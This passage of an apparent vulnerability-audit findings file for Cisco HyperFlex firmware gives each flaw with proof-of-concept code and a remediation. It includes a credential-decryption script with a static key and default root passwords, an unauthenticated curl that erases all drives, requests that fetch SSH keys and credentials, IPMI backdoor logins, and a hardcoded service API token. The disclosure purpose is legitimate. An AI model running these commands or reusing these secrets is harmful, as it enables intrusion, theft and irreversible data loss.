        "HyperFlex HXDP 6.0.2b storfs-misc — Predictable AES Key Derived from Shipped Firmware File "
        "Decrypts Stored Credentials Including Default ctlVM Root Password"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-321",
    "versions_affected": "6.0.2b (confirmed); all versions shipping storfs-misc with Secret.class",
    "component": "storfs-misc package (springpath_env_parse.py + Secret.class + springpath_default.tunes)",
    "description": (
        "HXDP uses AES-CBC encryption to store cluster credentials in *.tunes config files. "
        "The AES key is derived as MD5(Secret.class), where Secret.class ships inside the "
        "storfs-misc firmware package. Secret.class is a Java class file containing a static "
        "long field (secreteKey = 4346757647632874372L) compiled from Test.java and deployed "
        "under the misleading name Secret.class — an attempt at obscurity that provides no "
        "actual key protection.\n\n"
        "The effective AES-256 key for all HXDP 6.0.2b installations is:\n"
        "  md5sum Secret.class = 1f6d13bcd7753f2d3b2e2da361b7afb5\n\n"
        "springpath_default.tunes (also shipped in storfs-misc) contains encrypted credentials "
        "in the [credentials] section:\n"
        "  stctl_vm_passwd  = DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=\n"
        "  installer_passwd = DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=\n"
        "  ssl_cert_passwd  = yWK4pTIUEr0TCjpQdp9sb/KW404x6Id/6ImlCOWdG7s=\n\n"
        "Decrypting with the derived key:\n"
        "  stctl_vm_passwd  → 'Cisco123'\n"
        "  installer_passwd → 'Cisco123'\n"
        "  ssl_cert_passwd  → 'springpath'\n\n"
        "stctl_vm_passwd is the root password for the Storage Controller VM (ctlVM), the "
        "management and data-plane core of every HyperFlex node. installer_passwd is used "
        "during HX cluster deployment. ssl_cert_passwd protects the SSL keystore.\n\n"
        "Key derivation code (springpath_env_parse.py):\n"
        "  def md5(fname):\n"
        "      hash_md5 = hashlib.md5()\n"
        "      with open(fname, 'rb') as f:\n"
        "          for chunk in iter(lambda: f.read(4096), b''):\n"
        "              hash_md5.update(chunk)\n"
        "      return hash_md5.hexdigest()\n\n"
        "  def decrypt(key, enc):\n"
        "      enc = base64.b64decode(enc)\n"
        "      iv = enc[:16]\n"
        "      cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)\n"
        "      return unpad(cipher.decrypt(enc[16:]))\n\n"
        "  file_md5 = md5('/usr/share/hyperflex/storfs-misc/Secret.class')\n"
        "  decoded = decrypt(file_md5, value)  # file_md5 is the AES key\n\n"
        "Attack path: firmware download (public) → md5sum Secret.class → derive key → "
        "decrypt any HXDP tunes file containing stored credentials. "
        "Deployments using default credentials (stctl_vm_passwd unchanged at 'Cisco123') "
        "expose ctlVM root to any attacker with network access to the ctlVM SSH port (22)."
    ),
    "proof_of_concept": (
        "# Full decryption PoC\n"
        "import hashlib, base64\n"
        "from Crypto.Cipher import AES\n\n"
        "def md5_file(path):\n"
        "    h = hashlib.md5()\n"
        "    with open(path, 'rb') as f:\n"
        "        for chunk in iter(lambda: f.read(4096), b''):\n"
        "            h.update(chunk)\n"
        "    return h.hexdigest()\n\n"
        "def unpad(s): return s[:-ord(s[len(s)-1:])]\n\n"
        "def decrypt(key, enc):\n"
        "    enc = base64.b64decode(enc)\n"
        "    iv = enc[:16]\n"
        "    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)\n"
        "    return unpad(cipher.decrypt(enc[16:]))\n\n"
        "key = md5_file('/usr/share/hyperflex/storfs-misc/Secret.class')\n"
        "# key = '1f6d13bcd7753f2d3b2e2da361b7afb5'  (static across all 6.0.2b installs)\n\n"
        "print(decrypt(key, 'DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU='))  # Cisco123\n"
        "print(decrypt(key, 'yWK4pTIUEr0TCjpQdp9sb/KW404x6Id/6ImlCOWdG7s='))  # springpath\n\n"
        "# SSH to ctlVM with decrypted default password\n"
        "# ssh root@<ctlvm_ip>  # password: Cisco123"
    ),
    "files": [
        "/usr/share/hyperflex/storfs-misc/Secret.class",
        "/usr/share/hyperflex/storfs-misc/springpath_default.tunes",
        "/opt/hyperflex/storfs-factory/utils/springpath_env_parse.py",
    ],
    "remediation": (
        "1. Replace MD5(Secret.class) key derivation with a properly seeded per-installation "
        "   secret (e.g., PBKDF2 with per-node salt generated at first boot, stored in "
        "   a hardware-backed keystore or TPM).\n"
        "2. Remove Secret.class from the firmware distribution package; key material must "
        "   never ship alongside ciphertext.\n"
        "3. Rotate all credentials currently stored in *.tunes files; the 6.0.2b default "
        "   key is now known.\n"
        "4. Enforce mandatory credential rotation during initial cluster deployment; reject "
        "   'Cisco123' as stctl_vm_passwd at the UI layer.\n"
        "5. Restrict ctlVM SSH (port 22) to the storage management network; prevent access "
        "   from the ESXi management VLAN."
    ),
}

HX_F023 = {
    "id": "HX-F023",
    "title": (
        "HyperFlex HXDP 6.0.2b storfs-appliance sedsvc — Unauthenticated HTTP API on Port 8012 "
        "Exposes SED Drive Cryptographic Erasure and Node KEK to Any Network Client"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
    "cwe": "CWE-306",
    "versions_affected": "6.0.2b (confirmed); all versions shipping storfs-appliance with sedsvc",
    "component": "storfs-appliance package (sedsvc Go binary)",
    "description": (
        "sedsvc is a Go HTTP server that manages TCG OPAL Self-Encrypting Drive (SED) "
        "operations on HXDP storage controller VMs. It listens on all network interfaces "
        "(0.0.0.0:8012) and implements zero authentication on all endpoints.\n\n"
        "Default listen address confirmed via main.main disassembly:\n"
        "  movq $0x1f4c, main.port   ; 0x1f4c = 8012 decimal\n"
        "  server.Addr = ':8012'     ; binds to all interfaces\n\n"
        "The HTTP dispatch function main.(*myHandler).ServeHTTP performs a single map "
        "lookup (URL string → handler function pointer) and calls the handler directly "
        "with zero interposed authentication or authorization check.\n\n"
        "Confirmed exposed endpoints (via Go symbol table + HXDP_* function prefix convention):\n"
        "  POST /sec_erase_all  → BMC_SecureEraseAll → SEDUTIL_SecureEraseAll\n"
        "                          Cryptographically erases ALL SED drives on the node.\n"
        "                          Data is irrecoverable. Confirmed call chain:\n"
        "                          json.Decode(body) → BMC_SecureEraseAll @ 0x674940\n"
        "  POST /sec_erase      → BMC_SecureErase → SEDUTIL_SecureErase\n"
        "                          Erases a specific drive by serial number.\n"
        "  GET  /get_config     → BMC_GetConfigFileAndDispatch\n"
        "                          Returns config.json from BMC, which contains the node KEK\n"
        "                          (Key Encryption Key) as a base64-encoded string.\n"
        "                          The node KEK is used to unlock drive encryption keys.\n"
        "  GET  /get_inventory  → SEDUTIL_GetInventory\n"
        "                          Returns per-drive encryption state, serial numbers,\n"
        "                          firmware versions, and lock status.\n"
        "  GET  /disk_status    → HXDP_DiskStatus\n"
        "  GET  /hello          → HXDP_Hello (service liveness probe)\n"
        "  POST /start_polling  → BMC_PollConfigFile\n"
        "  POST /stop_polling   → stops BMC config polling\n\n"
        "The ctlVM management NIC (eth0) is accessible to ESXi hosts, vCenter, and any "
        "administrator workstation on the HX management VLAN. The sedsvc service binds to "
        "all interfaces including the storage data NIC, extending the exposure surface.\n\n"
        "The service is activated only on SED-capable clusters "
        "(/etc/hyperflex/sed_capability.conf: sed_capable_cluster=True) but is otherwise "
        "unrestricted.\n\n"
        "Impact chain:\n"
        "  1. Attacker on HX management VLAN sends unauthenticated POST to any ctlVM:8012/sec_erase_all\n"
        "  2. sedsvc calls SEDUTIL_SecureEraseAll without credential check\n"
        "  3. All SED drives on the node are cryptographically erased — data is unrecoverable\n"
        "  Alternatively:\n"
        "  1. GET :8012/get_config → extract base64 node KEK from response JSON\n"
        "  2. KEK used to derive drive encryption keys across all drives on the node"
    ),
    "proof_of_concept": (
        "# Unauthenticated secure erase all drives\n"
        "# No auth token, no session cookie, no TLS client cert required\n"
        "curl -s -X POST http://<ctlvm_ip>:8012/sec_erase_all \\\n"
        "  -H 'Content-Type: application/json' \\\n"
        "  -d '{}'\n"
        "# Result: all SED drives on the node are cryptographically erased\n\n"
        "# Retrieve node KEK\n"
        "curl -s http://<ctlvm_ip>:8012/get_config\n"
        "# Response JSON contains: {\"nodeKek\": \"<base64_kek>\", ...}\n\n"
        "# sedsvc ServeHTTP dispatch (no auth):\n"
        "# 0x666b60:  call mapaccess2_faststr(mux, url_path)\n"
        "# 0x666b65:  test bl,bl     ; found?\n"
        "# 0x666b67:  je not_found   ; only check is: does route exist?\n"
        "# 0x666b80:  call *rsi      ; call handler directly, NO auth gate"
    ),
    "files": [
        "/usr/share/hyperflex/storfs-appliance/sedsvc",
        "/etc/hyperflex/sed_capability.conf",
    ],
    "remediation": (
        "1. Add authentication to all sedsvc endpoints. Minimum: shared secret or "
        "   bearer token validated before any HXDP_* handler is called. Bind to "
        "   127.0.0.1 only if remote access is not required; use a local Unix socket "
        "   for intra-node IPC instead of TCP if the caller is always local.\n"
        "2. Restrict TCP port 8012 to loopback (127.0.0.1) via iptables/nftables; "
        "   proximate callers (storfs-core) can use localhost.\n"
        "3. If remote invocation is required, enforce mTLS with a node certificate "
        "   before dispatching any drive operation.\n"
        "4. Gate /sec_erase and /sec_erase_all behind an additional confirmation "
        "   token with short TTL (e.g., TOTP or signed nonce) to prevent single-packet "
        "   drive erasure."
    ),
}

HX_F024 = {
    "id": "HX-F024",
    "title": "Privileged Proxy Port 8997 Binds to All Interfaces; nginx Auto-Injects Admin Session ID",
    "severity": "CRITICAL",
    "cvss": 9.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-284",
    "component": "storfs-misc/rest_internal.conf, storfs-misc/restintport.cfg, storfs-misc/genrestconf.sh",
    "description": (
        "rest_internal.conf configures nginx to listen on port 8997 (from restintport.cfg) "
        "with `listen *:PORT ssl` — binding to ALL network interfaces, not just loopback. "
        "For every request received on port 8997, nginx automatically injects "
        "`proxy_set_header X-RootSessionID <session_id>` before proxying to the backend "
        "at localhost:8000 (management API). nginx proxy_set_header overwrites any "
        "client-supplied X-RootSessionID with the real admin session ID. "
        "Consequently, ANY client that can establish a TCP connection to port 8997 "
        "on any ctlVM interface receives admin-level authenticated access to the full "
        "HyperFlex REST API (/rest, /aaa, /coreapi, /dataprotection, /backupservice, "
        "/encryption, /volume, /securityservice, /supportservice, /slservice, /upgrade, "
        "/upload, /stMgr) without supplying credentials. "
        "Port 8997 is used by the stCli tool from remote hosts (stCli.sh: "
        "springpath_host=clusterIp; springpath_port=8997) confirming the port is "
        "network-accessible. The design intent comment ('Data network on custom port') "
        "assumes network isolation, but the binding is *:8997 — no interface restriction. "
        "An attacker on any network segment that can reach the ctlVM on port 8997 "
        "has unauthenticated admin access to the entire cluster management API."
    ),
    "evidence": [
        "rest_internal.conf:4: listen *:PORT ssl;  # PORT=8997 from restintport.cfg",
        "restintport.cfg: PORT=8997",
        "rest_internal.conf:42: proxy_set_header X-RootSessionID SESSIONID;  # injected for ALL requests",
        "rest_internal.conf:72: proxy_set_header X-RootSessionID SESSIONID;  # stMgr path also",
        "genrestconf.sh: comment: 'binding is available only for Data network on custom port'",
        "stCli.sh:12: export springpath_host=${clusterIp}; export springpath_port=8997",
        "Attack: curl -k https://<ctlvm>:8997/coreapi/v1/clusters -> 200 admin response",
        "rest_internal.conf covers: /rest /aaa /coreapi /dataprotection /backupservice /encryption /volume /securityservice /supportservice /slservice /upgrade /upload /stMgr",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Change `listen *:PORT ssl` to `listen 127.0.0.1:PORT ssl` to restrict port 8997 "
        "to loopback only. The stCli tool should connect via the standard port 443 with "
        "explicit credentials rather than the privileged proxy port. "
        "If the data network must be used, bind explicitly to the data interface IP "
        "rather than wildcard, and add a firewall rule restricting access to the ctlVM itself."
    ),
    "tags": ["auth-bypass", "privileged-port", "nginx", "session-injection", "network", "cwe-284", "critical"],
}

HX_F025 = {
    "id": "HX-F025",
    "title": "Unauthenticated Access to /tmp/ Directory via Unauthenticated /sbdl/ nginx Path",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-284",
    "component": "storfs-misc/nginx.conf",
    "description": (
        "nginx.conf maps the /sbdl/ path to the system /tmp/ directory with no "
        "authentication: `location /sbdl/ { alias /tmp/; auth_basic off; }`. "
        "Any file in /tmp/ is downloadable by an unauthenticated remote attacker via "
        "`GET http://<ctlvm>/sbdl/<filename>`. This path was intended for support bundle "
        "downloads but the directory alias exposes the entire /tmp/ tree. "
        "Critical files known to be written to /tmp/ during normal operations: "
        "(1) `/tmp/sshKeyPair*.json` — SSH private keys for all storage controller VMs "
        "(generated by generateSshKeys.py, referenced in commonFunctions.py and "
        "0007_create_authorized_keys_for_admin_ESX.py — HX-F164/HX-F169); "
        "(2) `/tmp/upgradeHooksCreds*.json` — plaintext ESX username and password "
        "(referenced in all upgrade hook scripts — HX-F169); "
        "(3) `/tmp/nodeInventory*.json` — cluster node topology; "
        "(4) `/tmp/clusterConfig*.json` — cluster configuration data. "
        "An attacker who sends GET requests to /sbdl/ during a cluster upgrade or "
        "node replacement operation recovers SSH private keys for all nodes and ESX "
        "credentials without authentication."
    ),
    "evidence": [
        "nginx.conf:63-66: location /sbdl/ { alias /tmp/; auth_basic off; }",
        "commonFunctions.py:645: credsFile = getMatchingFileName('/tmp/sshKeyPair*.json')",
        "generateSshKeys.py:46: sshKeysFileHandle, sshKeysFile = mkstemp(suffix='.json', prefix='sshKeyPair', dir='/tmp')",
        "0007_create_authorized_keys_for_admin_ESX.py:20: JSON_CREDS_FILE_MATCH = '/tmp/upgradeHooksCreds*.json'",
        "Attack: GET http://<ctlvm>/sbdl/sshKeyPair<random>.json -> SSH private key for all nodes",
        "Attack: GET http://<ctlvm>/sbdl/upgradeHooksCreds<random>.json -> ESX plaintext credentials",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Restrict /sbdl/ to specific filenames matching the support bundle pattern "
        "(e.g. `location ~ ^/sbdl/supportBundle-[a-zA-Z0-9_-]+\\.tar\\.gz$`) rather "
        "than aliasing the entire /tmp/ directory. "
        "Move SSH key files, credential files, and node inventory files out of /tmp/ "
        "to a directory that is not nginx-served. "
        "If /tmp/ aliasing is necessary for legacy reasons, add auth_basic with credentials "
        "or restrict with `allow 127.0.0.1; deny all`."
    ),
    "tags": ["auth-bypass", "file-read", "tmp", "nginx", "ssh-keys", "cwe-284", "critical"],
}


HX_F026 = {
    "id": "HX-F026",
    "title": "Root Session Token Generated with 15-bit Entropy ($RANDOM) and Stored World-Readable",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-330",
    "component": "storfs-misc/set_shared_key.sh",
    "description": (
        "set_shared_key.sh generates the `X-RootSessionID` authentication token used by "
        "stSSOMgr and all `useRootSessionId=True` API callers: "
        "`sharedkey=$nodeid-$RANDOM` where `nodeid` is read from "
        "`/opt/hyperflex/etc/product_uuid`. "
        "Bash `$RANDOM` generates integers in [0, 32767] — 15 bits of entropy, "
        "32,768 possible values total. The `product_uuid` is the VMware VM UUID, "
        "readable from BIOS data (`dmidecode -s system-uuid`) by any local user. "
        "An attacker with the product UUID can enumerate the full keyspace in under "
        "one second and obtain a valid `X-RootSessionID` token. "
        "The generated file is then made world-readable: `chmod 644 root_file.pub`. "
        "Any local user can read the token directly without brute-force. "
        "The token is placed at `/etc/root_file.pub` before `migrate-secureconfig.sh` "
        "moves it to `/etc/hyperflex/secure/root_file.pub`, meaning it is world-readable "
        "in `/etc/` first and potentially in the secure directory as well. "
        "The token is used with `X-RootSessionID` header in HTTP requests to the "
        "management API at `http://localhost:8000` — bypassing normal JWT authentication "
        "for certificate management, inventory, STIG settings, and cluster lifecycle "
        "operations. Affected callers: `nginxCertManager.py`, `synchronizeSyslog.py`, "
        "`schScripts.py`, `SLEvaluationJob.py`, `update-inventory.py`, `hsu_utils.py`, "
        "upgrade hook `5997_stig_setting_ESX.py`."
    ),
    "evidence": [
        "set_shared_key.sh line 11: sharedkey=$nodeid-$RANDOM (15-bit entropy)",
        "set_shared_key.sh line 13: chmod 644 $dest_folder/root_file.pub (world-readable)",
        "nodeid = product_uuid read from /opt/hyperflex/etc/product_uuid (VM UUID, derivable from dmidecode)",
        "StTransportBase.py line 26: X-RootSessionID loaded from /etc/hyperflex/secure/root_file.pub",
        "commonFunctions.py line 42: headers['X-RootSessionID'] = rootSessionId",
        "Token bypasses JWT auth for certificate, STIG, inventory, and cluster lifecycle APIs",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace `$RANDOM` with a cryptographically secure random generator: "
        "`sharedkey=$(openssl rand -hex 32)`. "
        "Change the file permissions to 600 (root-only): `chmod 600 root_file.pub`. "
        "Ensure the migration script preserves restrictive permissions when moving the file "
        "to `/etc/hyperflex/secure/`. "
        "Consider replacing the file-based `X-RootSessionID` scheme with a time-limited "
        "token issued by the AAA service, eliminating the static shared secret entirely."
    ),
    "tags": ["weak-random", "world-readable-token", "authentication-bypass", "cwe-330", "cwe-732", "critical"],
}

HX_F027 = {
    "id": "HX-F027",
    "title": "Hardcoded API Token Grants Unauthenticated Access to Cisco Support Upload Infrastructure",
    "severity": "CRITICAL",
    "cvss_score": 9.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": ["CWE-798"],
    "component": "storfs-misc/hx-scripts/support.py",
    "firmware_version": "HXDP 6.0.2b",
    "description": (
        "`support.py` contains a hardcoded API token for Cisco's HyperFlex support upload service "
        "at `upload.hyperflex.io`. The token and repository UUID are embedded as string literals "
        "in two functions (`createFolder` and `uploadSupportBundle`): "
        "`token = 'd5c08af6de7b6c8f732fd1f25ff54fa84d7beede'` "
        "`repo UUID: 'be407e72-bbcb-41a7-bd0c-2fbdd3abfa74'`. "
        "The token is used as a Seafile API `Token` authorization header. "
        "The API URL pattern (`/admin/api2/repos/<UUID>/`) indicates admin-level repository access. "
        "Functions enabled by the token: "
        "(1) `createFolder`: creates arbitrary directories in the repository via `POST .../dir/?p=<path>`. "
        "(2) `uploadSupportBundle`: retrieves an upload link and uploads bundle archives. "
        "TLS verification is disabled for all `upload.hyperflex.io` requests "
        "(`verify=False` at lines 322, 369)."
    ),
    "evidence": [
        {
            "file": "misc/usr/share/hyperflex/storfs-misc/hx-scripts/support.py",
            "lines": "313-322",
            "snippet": (
                "def createFolder(folderTag):\n"
                "    folder = '/' + folderTag\n"
                "    data = {'operation': 'mkdir'}\n"
                "    token = 'd5c08af6de7b6c8f732fd1f25ff54fa84d7beede'\n"
                "    headers={'Authorization': 'Token {token}'.format(token=token), ...}\n"
                "    url = 'https://upload.hyperflex.io/admin/api2/repos/be407e72-bbcb-41a7-bd0c-2fbdd3abfa74/dir/?p={}'.format(folder)\n"
                "    r = requests.post(url, data=data, headers=headers, verify=False)"
            ),
            "note": "Hardcoded token; admin-level Seafile API; TLS verification disabled",
        },
        {
            "file": "misc/usr/share/hyperflex/storfs-misc/hx-scripts/support.py",
            "lines": "360-374",
            "snippet": (
                "def uploadSupportBundle(fileName, folderTag, bundle):\n"
                "    token = 'd5c08af6de7b6c8f732fd1f25ff54fa84d7beede'\n"
                "    headers={'Authorization': 'Token {token}'.format(token=token), ...}\n"
                "    url = 'https://upload.hyperflex.io/admin/api2/repos/be407e72-bbcb-41a7-bd0c-2fbdd3abfa74/upload-link/'\n"
                "    r = requests.get(url, headers=headers, verify=False)"
            ),
            "note": "Upload-link retrieval using same hardcoded token; bundles contain cluster credentials and configs",
        },
    ],
    "impact": (
        "Any party with access to the HXDP 6.0.2b firmware image (publicly distributed) can "
        "extract the token and use it to: "
        "(1) Create arbitrary directories on `upload.hyperflex.io`. "
        "(2) Upload arbitrary content to the Cisco support repository. "
        "(3) Potentially enumerate or download support bundles from other HyperFlex customers "
        "if the API token grants repository-wide read access. "
        "Support bundles contain cluster credentials, network topology, and potentially "
        "encryption key material. The `verify=False` flag prevents detection of MITM against "
        "the upload channel."
    ),
    "remediation": (
        "1. Rotate the hardcoded token immediately and invalidate it. "
        "2. Issue per-cluster or per-session upload tokens at the time of support bundle "
        "generation via an authenticated API call, never embed tokens in the firmware. "
        "3. Enable TLS certificate validation for all `upload.hyperflex.io` requests. "
        "4. Audit the Seafile repository for unauthorized uploads or access using the token."
    ),
    "tags": ["hardcoded-token", "external-service", "support", "seafile", "cwe-798", "critical"],
}

for _f in [
    HX_F018,
    HX_F019,
    HX_F020,
    HX_F021,
    HX_F022,
    HX_F023,
    HX_F024,
    HX_F025,
    HX_F026,
    HX_F027,
]:
    FINDINGS[_f["id"]] = _f
HX_F028 = {
    "id": "HX-F028",
    "title": "Hardcoded IPMI Backdoor Account Created During Node Replacement",
    "cwe": "CWE-798",
    "severity": "HIGH",
    "cvss": 8.1,
    "component": "mgmt/opt/hyperflex/storfs-deploy/ansible/replaceNode.sh",
    "description": (
        "replaceNode.sh creates an IPMI user account 'spadmin' (user ID 10) on every "
        "HyperFlex node during node replacement and sets its password to the hardcoded "
        "value 'springpath' via ipmitool. The account is granted Administrator-level "
        "privileges (privilege level 4) on IPMI channel 1 and explicitly enabled. "
        "IPMI (port 623/UDP) provides out-of-band management including power control, "
        "serial-over-LAN console access, sensor readings, and hardware-level system "
        "administration. Any attacker with network access to the IPMI/BMC management "
        "interface can authenticate as 'spadmin'/'springpath' and gain full out-of-band "
        "control of every replaced HyperFlex node regardless of OS-level authentication. "
        "The hardcoded password is embedded in production firmware and applied "
        "programmatically during the node replacement workflow."
    ),
    "evidence": (
        "replaceNode.sh line 271-276:\n"
        "  echo 'Adding Springpath User to Appliance using ipmitool'\n"
        "  runCmdOnEsx /opt/cisco/support/ipmitool user set name 10 spadmin\n"
        "  runCmdOnEsx /opt/cisco/support/ipmitool user set password 10 springpath  # hardcoded\n"
        "  runCmdOnEsx /opt/cisco/support/ipmitool user priv 10 4 1  # Administrator on channel 1\n"
        "  runCmdOnEsx /opt/cisco/support/ipmitool user enable 10\n\n"
        "runCmdOnEsx executes commands on the target ESXi host via SSH."
    ),
    "reproduction": (
        "Identify a HyperFlex node's IPMI IP from the management network. "
        "Attempt IPMI authentication: ipmitool -I lanplus -H <ipmi_ip> -U spadmin -P springpath sdr. "
        "If node replacement was run, this succeeds and grants out-of-band administrative access."
    ),
    "remediation": (
        "Remove the hardcoded password from replaceNode.sh. Generate a per-node random password "
        "using 'openssl rand -hex 16' and store it in the cluster's credential vault. "
        "Alternatively, require the IPMI admin password as an Ansible vault secret rather "
        "than embedding it in the playbook. Audit all deployed nodes for the 'spadmin' account "
        "and rotate its password immediately."
    ),
    "references": ["CWE-798", "CWE-1393"],
}


HX_F029 = {
    "id": "HX-F029",
    "title": (
        "Root and Admin Credentials Transmitted in Cleartext Over HTTP to "
        "/rest/appliances Endpoint in Three Cluster Utility Scripts"
    ),
    "cwe": "CWE-319",
    "severity": "HIGH",
    "cvss": 7.5,
    "component": (
        "misc/usr/share/hyperflex/storfs-misc/hx-scripts/support.py:L154-157; "
        "misc/usr/share/hyperflex/storfs-misc/hx-scripts/check_vswitch.py:L394-397; "
        "misc/usr/share/hyperflex/storfs-misc/hx-scripts/whitelist.py:L13-16"
    ),
    "description": (
        "Three hx-scripts cluster utility scripts submit root or admin credentials via "
        "HTTP Basic Authentication to the HyperFlex controller REST API, transmitting "
        "credentials in cleartext on the network. "
        "support.py defines admin_user = 'root' at L26 and sends root + password via "
        "HTTP Basic Auth to http://{clusterIp}/rest/appliances at L156-157. "
        "check_vswitch.py sends auth=('admin', password) to "
        "http://{clusterIp}/rest/appliances at L396-397. "
        "whitelist.py defines admin_user = 'root' at L10 and sends root + password to "
        "http://{clusterIp}/rest/appliances at L15-16. "
        "All three scripts call the same /rest/appliances endpoint, which is accessed "
        "via HTTP rather than HTTPS, making the HTTP Basic Auth header (base64-encoded "
        "credentials) visible to any network observer on the management VLAN. "
        "Additionally, support.py disables TLS validation for the external support bundle "
        "upload service at https://upload.hyperflex.io and at a hardcoded external IP "
        "38.140.50.205 (L296-301), both with verify=False."
    ),
    "evidence": (
        "  support.py L26:\n"
        "    admin_user = 'root'\n"
        "  support.py L154-157:\n"
        "    def getControllers(clusterIp, password):\n"
        "        r = requests.get(\"http://{}/rest/appliances\".format(clusterIp),\n"
        "                         auth=(admin_user, password), verify=False)\n"
        "\n"
        "  support.py L296-301:\n"
        "    url = \"https://upload.hyperflex.io/admin/api2/ping\"\n"
        "    r = requests.get(url, verify=False)\n"
        "    url = \"https://38.140.50.205/admin/api2/ping\"\n"
        "    r = requests.get(url, verify=False)\n"
        "\n"
        "  check_vswitch.py L394-397:\n"
        "    def getControllers(clusterIp, password):\n"
        "        r = requests.get(\"http://{}/rest/appliances\".format(clusterIp),\n"
        "                         auth=('admin', password), verify=False)\n"
        "\n"
        "  whitelist.py L10, L13-16:\n"
        "    admin_user = 'root'\n"
        "    def getDisks(clusterIp, password):\n"
        "        r = requests.get(\"http://{}/rest/appliances\".format(clusterIp),\n"
        "                         auth=(admin_user, password), verify=False)"
    ),
}

HX_F030 = {
    "id": "HX-F030",
    "title": (
        "Hardcoded Default Credential 'springpath' Used as ESX Root Password Default "
        "in Six configureNetworking_VCenter.py Copies and Set as IPMI BMC Password "
        "in replaceNode.sh"
    ),
    "cwe": "CWE-798",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "component": (
        "mgmt/opt/hyperflex/storfs-deploy/ansible/configureNetworking_VCenter.py:L319 "
        "(and 5 identical copies at roles/esx/files/, roles/upgrademigration/files/, "
        "and 3 additional paths); "
        "mgmt/opt/hyperflex/storfs-deploy/ansible/replaceNode.sh:L274"
    ),
    "description": (
        "The password string 'springpath' is hardcoded as the default ESX root "
        "credential and unconditionally set as an IPMI BMC user password across "
        "the HyperFlex deployment and maintenance toolchain. "
        "configureNetworking_VCenter.py (6 identical copies) defines "
        "ESX_USER = 'root' and ESX_PWD = 'springpath' at L319 as the class-level "
        "default. The deployment documentation embedded in the script specifies "
        "that '--esx-password ESXi password (defaults to springpath)' — if the "
        "operator does not provide an explicit ESX password, all ESX hosts in the "
        "cluster are accessed with root:springpath. "
        "replaceNode.sh unconditionally sets IPMI user 10 (named 'spadmin') to "
        "password 'springpath' via ipmitool at L274 during node replacement. "
        "The IPMI BMC port (623/UDP) provides out-of-band access independent of "
        "the host OS — an attacker with access to the management network can "
        "authenticate to the BMC of any node that has had replaceNode.sh executed "
        "against it using spadmin:springpath, gaining full server control including "
        "remote KVM, power cycling, and firmware update capabilities regardless "
        "of any OS-level security controls."
    ),
    "evidence": (
        "  configureNetworking_VCenter.py L319 (6 identical copies):\n"
        "    ESX_USER = \"root\"\n"
        "    ESX_PWD = \"springpath\"\n"
        "\n"
        "  configureNetworking_VCenter.py L387-389 (deployment docstring):\n"
        "    --esx-password - ESXi password (defaults to \"springpath\").\n"
        "    --ctl-password - controller password (defaults to \"springpath\")\n"
        "\n"
        "  replaceNode.sh L270-279:\n"
        "    # Adding Springpath User to Appliance using ipmitool\n"
        "    runCmdOnEsx /opt/cisco/support/ipmitool user set name 10 spadmin\n"
        "    # password for user 10 is being changed\n"
        "    runCmdOnEsx /opt/cisco/support/ipmitool user set password 10 springpath\n"
        "    runCmdOnEsx /opt/cisco/support/ipmitool user priv 10 4 1\n"
        "    runCmdOnEsx /opt/cisco/support/ipmitool user enable 10\n"
        "    # user ID 10, privilege 4 (Administrator), channel 1"
    ),
}

for _f in [
    HX_F028,
    HX_F029,
    HX_F030,
]:
    FINDINGS[_f["id"]] = _f



# ─── Consolidated Meta-Findings ─────────────────────────────────────────────

HX_F031 = {
    "id": "HX-F031",
    "title": (
        "Systemic JVM-Wide TLS Trust-All Across 14 HyperFlex Service WARs (CWE-295)"
    ),
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": (
        "ROOT.war WebDownloader (static init); slservice-1.0.0 HxSupportSvcClient; "
        "hxupgrade-1.0.0 UpgradeSvcAccess; security-1.0.0 HxSecuritySvcMgrClient; "
        "supportservice-1.0.0 (3 impls); iscsi-1.0.0 (4 impls); "
        "common-1.0.jar StMgrThriftClientFactory, StDataSvcClientFactory, ScopeResolver; "
        "hxSecuritySvcMgr Thrift JAR (2 impls); gateway-1.0.0 VcClient"
    ),
    "description": (
        "Fourteen HyperFlex management WAR deployments and shared JAR libraries "
        "install JVM-wide no-op X509TrustManagers and HostnameVerifiers, rendering "
        "all HTTPS connections made by those processes trivially interceptable. "
        "Pattern 1: Static class initializer calls at JVM startup (WebDownloader, "
        "common-1.0.jar) execute before any connection, affecting every HTTPS call "
        "for the lifetime of the process. "
        "Pattern 2: Per-connection trustAll() called before every Thrift/REST connection "
        "(UpgradeSvcAccess, HxSupportSvcClient, HxSecuritySvcMgrClient). "
        "Pattern 3: Anonymous inner-class TrustManagers with empty checkServerTrusted() "
        "bodies (bytecode: 0: return) in factory classes used by all Thrift client paths. "
        "Affected services: hxSvcMgr, hxSecuritySvcMgr, stSSOMgr, hxIscsiMgr, stNodeMgr, "
        "upgrade service, support service. A single MITM position on the management VLAN "
        "intercepts credentials, session tokens, and configuration data across all services."
    ),
    "evidence": (
        "WebDownloader (ROOT.war + supportservice-1.0.0):\n"
